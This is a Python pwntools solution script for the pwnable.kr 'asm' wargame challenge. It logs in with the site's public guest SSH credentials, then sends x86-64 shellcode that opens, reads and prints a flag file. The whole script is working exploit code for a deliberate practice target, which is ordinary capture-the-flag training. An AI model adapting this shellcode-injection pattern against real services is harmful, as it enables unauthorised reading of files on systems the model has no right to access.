from pwn import *
 
context(arch='amd64', os='linux')

filename = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'

shellcode = ""
shellcode += shellcraft.pushstr(filename)
shellcode += shellcraft.open('rsp', 0)
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)
 
s = ssh(user='asm',host='pwnable.kr',port=2222,password='guest')
conn = s.connect_remote('localhost', 9026)

conn.recvuntil("give me your x64 shellcode:")
conn.sendline(asm(shellcode))
conn.interactive()